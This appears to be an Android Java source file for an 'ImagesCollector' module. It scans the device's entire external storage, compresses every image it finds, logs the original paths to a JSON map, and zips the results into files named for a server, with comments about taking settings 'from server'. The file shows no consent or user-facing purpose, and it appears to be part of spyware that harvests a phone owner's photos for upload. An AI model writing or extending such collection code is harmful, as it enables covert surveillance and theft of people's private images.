package com.tangledbytes.sw.collectors;

import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import com.tangledbytes.sw.guides.ImageCollectorGuide;
import com.tangledbytes.sw.utils.Constants;
import com.tangledbytes.sw.utils.FileUtils;
import com.tangledbytes.sw.utils.ImageCompressor;
import com.tangledbytes.sw.utils.ZipUtils;

import org.json.JSONArray;
import org.json.JSONException;

import java.io.File;
import java.io.IOException;
import java.util.Random;

public class ImagesCollector extends Collector {
    private static final String TAG = "ImagesCollector";
    JSONArray collectedImagesMap = new JSONArray();

    public boolean isValidImage(File file) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(file.toString(), options);
        return options.outHeight > 0 && options.outWidth > 0;
    }

    @Override
    public void collect() {
        try {
            compressImages();
            FileUtils.write(Constants.FILE_SERVER_IMAGES_MAP, collectedImagesMap.toString());
            addImagesToZip();
        } catch (IOException e) {
            Log.wtf(TAG, "Failed to write compressed images map", e);
        }
    }

    private void addImagesToZip() {
        File[] compressedImages = Constants.DIR_COMPRESSED_IMAGES.listFiles();
        if (compressedImages == null)
            return;
        try {
            if (Constants.FILE_SERVER_IMAGES_ZIP.exists())
                Constants.FILE_SERVER_IMAGES_ZIP.delete();
            Constants.FILE_SERVER_IMAGES_ZIP.createNewFile();
            ZipUtils zipUtils = new ZipUtils();
            zipUtils.zip(compressedImages, Constants.FILE_SERVER_IMAGES_ZIP, true);
        } catch (IOException e) {
            Log.wtf(TAG, "Failed to create zip compressed images", e);
        }
    }

    private void compressImages() {
        ImageCollectorGuide guide = new ImageCollectorGuide();
        // TODO: Scan whole system
//        File[] files = new File(Environment.getExternalStorageDirectory(), "DCIM").listFiles();
        File[] files = Environment.getExternalStorageDirectory().listFiles();
        if (files == null) return;
        for (File file : files) {
//            if(file.getName().equals("sparrow"))
//                continue;
            // TODO: Load quality from server
            if (file.getName().equals("Android")) guide.setImageQuality(1);
            else guide.setImageQuality(8);
            if(file.isDirectory()) Files.scanFiles(file, (imageFile) -> collectImage(imageFile, file.getName(), guide));
            else collectImage(file, "root", guide);
        }
    }

    private void collectImage(File imageSrc, String destDirName, ImageCollectorGuide guide) {
        if (!isValidImage(imageSrc))
            return;
        File imageDest = generateImageDest(new File(Constants.DIR_COMPRESSED_IMAGES, destDirName));
        Log.i(TAG, String.format("Compressing %s to %s...", imageSrc, imageDest));
        ImageCompressor.compress(imageSrc, imageDest, guide);
        try {
            collectedImagesMap.put(new JSONArray(String.format("['%s', '%s']", imageSrc, imageDest.getName())));
        } catch (JSONException e) {
            Log.wtf(TAG, e);
        }
    }

    private File generateImageDest(File destDir) {
        if(!destDir.exists())
            destDir.mkdirs();
        File outputImage;
        Random random = new Random();
        do {
            outputImage = new File(destDir, Math.abs(random.nextLong()) + ".jpg");
        } while (outputImage.exists());
        return outputImage;
    }
}
